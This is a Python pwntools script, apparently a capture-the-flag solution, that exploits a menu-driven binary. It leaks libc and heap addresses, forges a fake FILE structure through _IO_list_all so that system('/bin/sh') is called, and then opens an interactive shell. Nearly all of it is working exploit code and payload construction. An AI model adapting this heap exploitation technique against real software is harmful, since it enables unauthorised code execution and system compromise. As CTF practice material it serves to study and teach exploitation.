from pwn import *
import sys

if len(sys.argv) < 2:
	debug = True
else:
	debug = False

if debug:
	#p = process("./pwn2")
	p = remote("127.0.0.1","1300")	
	libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
else:
	p = remote(ip,port)
	libc = ELF("./libc6_2.23-0ubuntu10_amd64.so") #unknown

def menu(choice):
	p.sendafter("Your choice-> \n",str(choice))

def add(size,name):
	menu(1)
	p.sendafter("Input string Length: \n",str(size))
	p.sendafter("Author name:\n",name)

def edit(name,content):
	menu(2)
	p.sendafter("New Author name:\n",name)
	p.sendafter("New contents:\n",content)

def show():
	menu(3)

def free():
	menu(4)

def magic():
	menu(666)

code_base = 0x555555554000
def debugf():
	if debug:
		gdb.attach(p,"b *{b1}".format(b1 = hex(code_base + 0xA77)))

context.log_level = "debug"
context.terminal = ["tmux","splitw","-h"]
#debugf()
magic()
leak_addr = int(p.recvline().strip(),16)
libc.address = leak_addr - libc.symbols["puts"]
log.success("libc_base:" + hex(libc.address))
add(0x100,"a"*8)
edit("a"*8,"a"*0x68)
show()
p.recvuntil("a"*0x68)
leak_addr = u64(p.recvuntil("\n",drop = True).ljust(8,"\x00"))
heap_base = leak_addr - 0xf0
log.success("heap_base:" + hex(heap_base))
payload = "/bin/sh\x00"
payload = payload.ljust(0x20,"\x00")
payload += p64(0xff) + p64(0x100)
payload = payload.ljust(0xc0,"\x00")
payload += p64(0)
payload = payload.ljust(0xd8,"\x00")
payload += p64(heap_base)
edit("a"*8,payload)
edit(p64(libc.symbols["system"]) + p64(libc.symbols["_IO_list_all"]),p64(heap_base + 0x30))
free()
p.sendline("exec /bin/sh 1>&0")
p.interactive()
